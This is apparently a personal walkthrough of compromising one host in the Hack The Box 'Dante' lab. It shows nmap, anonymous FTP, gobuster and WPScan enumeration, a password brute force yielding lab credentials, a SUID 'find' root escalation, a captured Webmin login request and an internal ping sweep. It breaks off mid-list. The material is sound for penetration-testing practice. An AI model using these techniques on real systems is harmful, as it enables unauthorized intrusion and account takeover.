# 10.10.110.100 - DANTE-WEB-NIX01 Pwn3d!

sudo nmap -sC -sV 10.10.110.100

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-28 19:09 CDT

Nmap scan report for 10.10.110.100

Host is up (0.013s latency).

Not shown: 997 filtered tcp ports (no-response)

PORT STATE SERVICE VERSION

21/tcp open ftp vsftpd 3.0.3

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|_Can’t get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100

| ftp-syst:

| STAT:

| FTP server status:

| Connected to ::ffff:10.10.14.46

| Logged in as ftp

| TYPE: ASCII

| No session bandwidth limit

| Session timeout in seconds is 300

| Control connection is plain text

| Data connections will be plain text

| At session startup, client count was 3

| vsFTPd 3.0.3 - secure, fast, stable

|_End of status

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)

| 256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)

|_ 256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)

65000/tcp open http Apache httpd 2.4.41 ((Ubuntu))

|_http-title: Apache2 Ubuntu Default Page: It works

| http-robots.txt: 2 disallowed entries

|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}

|_http-server-header: Apache/2.4.41 (Ubuntu)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 21.18 seconds

ftp anonymous@10.10.110.100

Connected to 10.10.110.100.

220 (vsFTPd 3.0.3)

331 Please specify the password.

Password:

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

229 Entering Extended Passive Mode (|||28130|)

ftp: Can’t connect to `10.10.110.100:28130’: Connection timed out

200 EPRT command successful. Consider using EPSV.

150 Here comes the directory listing.

drwxr-xr-x 4 0 0 4096 Apr 14 2021 Transfer

226 Directory send OK.

ftp>

ftp> cd Transfer

250 Directory successfully changed.

ftp> ls

200 EPRT command successful. Consider using EPSV.

150 Here comes the directory listing.

drwxr-xr-x 2 0 0 4096 Apr 14 2021 Incoming

drwxr-xr-x 2 0 0 4096 Aug 04 2020 Outgoing

226 Directory send OK.

ftp> cd Incoming

250 Directory successfully changed.

ftp> ls

200 EPRT command successful. Consider using EPSV.

150 Here comes the directory listing.

-rw-r–r– 1 0 0 310 Aug 04 2020 todo.txt

226 Directory send OK.

ftp> get todo.txt

local: todo.txt remote: todo.txt

200 EPRT command successful. Consider using EPSV.

150 Opening BINARY mode data connection for todo.txt (310 bytes).

100% |***********************************| 310 6.29 MiB/s 00:00 ETA

226 Transfer complete.

310 bytes received in 00:00 (34.12 KiB/s)

ftp> exit

221 Goodbye.

┌─[us-dante-1]─[10.10.14.46]─[ronking37@htb-zrpwaqftm7]─[~]

└──╼ [★]$ cat todo.txt

- Finalize Wordpress permission changes - PENDING

- Update links to to utilize DNS Name prior to changing to port 80 - PENDING

- Remove LFI vuln from the other site - PENDING

- Reset James’ password to something more secure - PENDING

- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS

gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.110.100:65000/ -t 200

===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url: http://10.10.110.100:65000/

[+] Method: GET

[+] Threads: 200

[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

[+] Negative Status codes: 404

[+] User Agent: gobuster/3.6

[+] Timeout: 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

/wordpress (Status: 301) [Size: 327] [–> http://10.10.110.100:65000/wordpress/]

/server-status (Status: 403) [Size: 281]

Progress: 220560 / 220561 (100.00%)

===============================================================

Finished

===============================================================

sudo wpscan --url http://10.10.110.100:65000/wordpress --enumerate u

_______________________________________________________________

__ _______ _____

\ \ / / __ \ / ____|

\ \ /\ / /| |__) | (___ ___ __ _ _ __ ®

\ \/ \/ / | ___/ \___ \ / __|/ _` | ’_ \

\ /\ / | | ____) | (__| (_| | | | |

\/ \/ |_| |_____/ \___|\__,_|_| |_|

```
     WordPress Security Scanner by the WPScan Team
                     Version 3.8.27
   Sponsored by Automattic \- https://automattic.com/
   @\_WPScan\_, @ethicalhack3r, @erwan\_lr, @firefart
```

_______________________________________________________________

[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]

[+] Started: Sat Mar 28 19:51:56 2026

Interesting Finding(s):

[+] Headers

| Interesting Entry: Server: Apache/2.4.41 (Ubuntu)

| Found By: Headers (Passive Detection)

| Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt

| Found By: Robots Txt (Aggressive Detection)

| Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php

| Found By: Direct Access (Aggressive Detection)

| Confidence: 100%

| References:

| - http://codex.wordpress.org/XML-RPC_Pingback_API

| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/

| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/

| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/

| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html

| Found By: Direct Access (Aggressive Detection)

| Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log

| Found By: Direct Access (Aggressive Detection)

| Confidence: 100%

| Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/

| Found By: Direct Access (Aggressive Detection)

| Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php

| Found By: Direct Access (Aggressive Detection)

| Confidence: 60%

| References:

| - https://www.iplocation.net/defend-wordpress-from-ddos

| - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).

| Found By: Rss Generator (Passive Detection)

| - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

| - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty

| Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/

| Last Updated: 2025-12-03T00:00:00.000Z

| Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt

| [!] The version is out of date, the latest version is 3.0

| Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2

| Style Name: Twenty Twenty

| Style URI: https://wordpress.org/themes/twentytwenty/

| Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor…

| Author: the WordPress team

| Author URI: https://wordpress.org/

|

| Found By: Css Style In Homepage (Passive Detection)

|

| Version: 1.2 (80% confidence)

| Found By: Style (Passive Detection)

| - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: ‘Version: 1.2’

[+] Enumerating Users (via Passive and Aggressive Methods)

Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin

| Found By: Author Posts - Author Pattern (Passive Detection)

| Confirmed By:

| Rss Generator (Passive Detection)

| Wp Json Api (Aggressive Detection)

| - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1

| Author Id Brute Forcing - Author Pattern (Aggressive Detection)

| Login Error Messages (Aggressive Detection)

[+] james

| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

| Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.

[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Mar 28 19:52:00 2026

[+] Requests Done: 57

[+] Cached Requests: 7

[+] Data Sent: 17.177 KB

[+] Data Received: 486.154 KB

[+] Memory used: 186.387 MB

[+] Elapsed time: 00:00:04

sudo wpscan --url http://10.10.110.100:65000/wordpress --passwords rockyou.txt --usernames james --max-threads 50

…

[!] Valid Combinations Found:

| Username: james, Password: Toyota

![](10%2010%20110%20100%20-%20DANTE-WEB-NIX01%20Pwn3d%21/imported-image-Hgy.png)

![](10%2010%20110%20100%20-%20DANTE-WEB-NIX01%20Pwn3d%21/imported-image-ZKiz.png)

![](10%2010%20110%20100%20-%20DANTE-WEB-NIX01%20Pwn3d%21/imported-image-OBwR.png)

![](10%2010%20110%20100%20-%20DANTE-WEB-NIX01%20Pwn3d%21/imported-image-fq.png)

# id

www-data@DANTE-WEB-NIX01:/$export TERM=xterm
www-data@DANTE-WEB-NIX01:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@DANTE-WEB-NIX01:/$ find . -exec /bin/sh -p \; -quit

uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

![](10%2010%20110%20100%20-%20DANTE-WEB-NIX01%20Pwn3d%21/imported-image-uXz.png)

![](10%2010%20110%20100%20-%20DANTE-WEB-NIX01%20Pwn3d%21/imported-image-fdLK.png)

![](10%2010%20110%20100%20-%20DANTE-WEB-NIX01%20Pwn3d%21/imported-image-iAuR.png)

![](10%2010%20110%20100%20-%20DANTE-WEB-NIX01%20Pwn3d%21/imported-image-dJx.png)

cat headers.txt

POST /session_login.cgi HTTP/1.1

Host: 172.16.88.154:10000

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://172.16.88.154:10000/session_login.cgi?logout=1

Content-Type: application/x-www-form-urlencoded

Content-Length: 28

Origin: http://172.16.88.154:10000

DNT: 1

Connection: keep-alive

Cookie: redirect=1; testing=1; sid=x

Upgrade-Insecure-Requests: 1

user=admin&pass=password6543

HTTP/1.0 200 Document follows

Date: Thu, 25 Jun 2020 21:00:47 GMT

Server: MiniServ/1.900

Connection: close

Auth-type: auth-required=1

Set-Cookie: redirect=1; path=/

Set-Cookie: testing=1; path=/

X-Frame-Options: SAMEORIGIN

Content-Security-Policy: script-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’; frame-src ‘self’; child-src ‘self’

Set up ligolo tunnel

[https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/)

Ping subnet and see what responds

for ip in {1..254}; do ping -c 1 -W 1 172.16.1.$ip | grep “64 bytes” & done; wait

172.16.1.5:

172.16.1.10

172.16.1.12:

172.16.1.17

172.16.1.19:

172.16.1.13:

172.16.1.100:

172.16.1.101

172.16.1.102

**172.16.1.5**